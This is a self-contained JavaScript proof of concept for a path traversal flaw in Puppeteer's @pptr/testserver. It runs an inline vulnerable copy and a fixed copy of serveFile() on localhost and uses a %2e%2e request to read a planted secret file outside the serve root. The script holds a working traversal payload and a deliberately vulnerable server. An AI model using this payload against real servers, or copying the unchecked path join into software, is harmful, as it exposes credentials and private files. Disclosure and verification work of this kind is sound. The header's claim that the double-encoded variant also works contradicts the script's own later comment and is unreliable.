/**
 * PoC 1 — Path Traversal in @pptr/testserver
 *
 * Vulnerability: packages/testserver/src/index.ts  serveFile()
 *
 * Root cause (pre-fix):
 *   pathName = decodeURIComponent(pathName);           // expands %2e%2e → ..
 *   const filePath = join(this.#dirPath, pathName.substring(1));
 *   // No bounds check — path.join() resolves ".." and escapes the root dir
 *
 * Exploit path:
 *   1. HTTP client sends GET /%2e%2e/secret.txt  (browsers normalize this away,
 *      but curl / raw sockets / other HTTP clients do not).
 *   2. decodeURIComponent converts %2e%2e → ..
 *   3. path.join('/serve-root', '../secret.txt') → '/secret.txt'   (escape!)
 *   4. readFile('/secret.txt') returns content of an out-of-root file.
 *
 *   Double-encoded variant (%252e%252e) also works because decodeURIComponent
 *   decodes %25 → %, producing %2e%2e, which a second pass through the URL
 *   would further decode — however the more impactful attack is the raw
 *   single-encoded path sent by non-browser clients (curl, axios, node:http).
 *
 * Impact:
 *   Any file readable by the process running the test server can be retrieved.
 *   In CI environments this exposes ~/.npmrc tokens, SSH keys, env files, etc.
 *
 * Fixed in:  commit 174ad20
 *   + const resolvedBase = resolve(this.#dirPath) + sep;
 *   + if (!resolve(filePath).startsWith(resolvedBase)) { 403; return; }
 *
 * Google VRP scope: puppeteer/puppeteer
 */

import http from 'node:http';
import {readFile} from 'node:fs';
import {join, resolve, sep} from 'node:path';
import {tmpdir} from 'node:os';
import {mkdtempSync, writeFileSync} from 'node:fs';

// ────────────────────────────────────────────────────────────────────────────
// Inline both the VULNERABLE and SAFE serveFile implementations so the PoC
// is self-contained and doesn't depend on whether the package is compiled.
// ────────────────────────────────────────────────────────────────────────────

function vulnerableServeFile(dirPath, pathName, res) {
  pathName = decodeURIComponent(pathName);
  if (pathName === '/') pathName = '/index.html';
  const filePath = join(dirPath, pathName.substring(1));
  // ← BUG: no bounds check; path.join resolves ".." out of dirPath
  readFile(filePath, (err, data) => {
    if (err) { res.writeHead(404); res.end(`File not found: ${filePath}`); return; }
    res.writeHead(200);
    res.end(data);
  });
}

function fixedServeFile(dirPath, pathName, res) {
  pathName = decodeURIComponent(pathName);
  if (pathName === '/') pathName = '/index.html';
  const filePath = join(dirPath, pathName.substring(1));
  const resolvedBase = resolve(dirPath) + sep;
  if (!resolve(filePath).startsWith(resolvedBase)) {
    res.writeHead(403); res.end('Forbidden'); return;
  }
  readFile(filePath, (err, data) => {
    if (err) { res.writeHead(404); res.end(`File not found: ${filePath}`); return; }
    res.writeHead(200);
    res.end(data);
  });
}

// ── Set up filesystem layout ─────────────────────────────────────────────────
//   /tmp/pptr-poc-XXXXX/          ← serve root
//   /tmp/pptr-poc-XXXXX/index.html
//   /tmp/                         ← parent (OUTSIDE serve root)
//   /tmp/poc-secret.txt           ← file we want to exfiltrate

const serveRoot = mkdtempSync(join(tmpdir(), 'pptr-poc-'));
writeFileSync(join(serveRoot, 'index.html'), '<h1>TestServer root</h1>');
const secretFile = join(serveRoot, '..', 'poc-secret.txt');
writeFileSync(secretFile, 'EXFILTRATED: api_key=super-secret-12345\n');

// ── Raw HTTP helper (bypasses URL normalization in fetch / browser) ───────────
function rawGet(port, rawPath) {
  return new Promise((resolve, reject) => {
    // Use raw socket write so the path is sent verbatim — no URL normalization
    const req = http.request(
      {hostname: '127.0.0.1', port, method: 'GET', path: rawPath},
      res => {
        let body = '';
        res.on('data', c => (body += c));
        res.on('end', () => resolve({status: res.statusCode, body}));
      },
    );
    req.on('error', reject);
    req.end();
  });
}

// ── Spin up vulnerable server and fixed server on separate ports ──────────────
const vulnServer  = http.createServer((req, res) => vulnerableServeFile(serveRoot, req.url, res));
const fixedServer = http.createServer((req, res) => fixedServeFile(serveRoot, req.url, res));

await new Promise(r => vulnServer.listen(0,  '127.0.0.1', r));
await new Promise(r => fixedServer.listen(0, '127.0.0.1', r));
const vulnPort  = vulnServer.address().port;
const fixedPort = fixedServer.address().port;

console.log('='.repeat(60));
console.log('PoC 1 — Path Traversal in @pptr/testserver serveFile()');
console.log('='.repeat(60));
console.log(`Serve root   : ${serveRoot}`);
console.log(`Secret target: ${secretFile}`);
console.log(`Vuln  server : port ${vulnPort}`);
console.log(`Fixed server : port ${fixedPort}`);
console.log('');

// ── 1. Normal request ────────────────────────────────────────────────────────
let r = await rawGet(vulnPort, '/index.html');
console.log(`[NORMAL]  GET /index.html  → HTTP ${r.status}: ${r.body.trim()}`);
console.log('');

// ── 2. Single-encoded traversal — %2e%2e (the main vulnerability) ────────────
//    raw path: /%2e%2e/poc-secret.txt
//    after decodeURIComponent: /../poc-secret.txt
//    after join: /tmp/poc-secret.txt  (outside serve root)
const traversalPath = `/%2e%2e/poc-secret.txt`;
console.log(`[ATTACK 1] GET ${traversalPath}  (single-encoded, sent via raw HTTP)`);

r = await rawGet(vulnPort, traversalPath);
console.log(`           VULNERABLE server → HTTP ${r.status}: ${r.body.trim()}`);
if (r.status === 200 && r.body.includes('EXFILTRATED')) {
  console.log('           ✗  EXPLOITED — file outside serve root returned!');
} else {
  console.log('           ✓  PROTECTED');
}

r = await rawGet(fixedPort, traversalPath);
console.log(`           FIXED server    → HTTP ${r.status}: ${r.body.trim()}`);
console.log('');

// ── 3. Double-encoded variant — %252e%252e ───────────────────────────────────
//    raw path: /%252e%252e/poc-secret.txt
//    after first decodeURIComponent: /%2e%2e/poc-secret.txt
//    path.join sees literal "%2e%2e" — not treated as "..", so traversal fails
const doublePath = `/%252e%252e/poc-secret.txt`;
console.log(`[BONUS]    GET ${doublePath}  (double-encoded — for comparison)`);
r = await rawGet(vulnPort, doublePath);
console.log(`           VULNERABLE server → HTTP ${r.status} (double-encode does NOT bypass path.join)`);
console.log('');

vulnServer.close();
fixedServer.close();
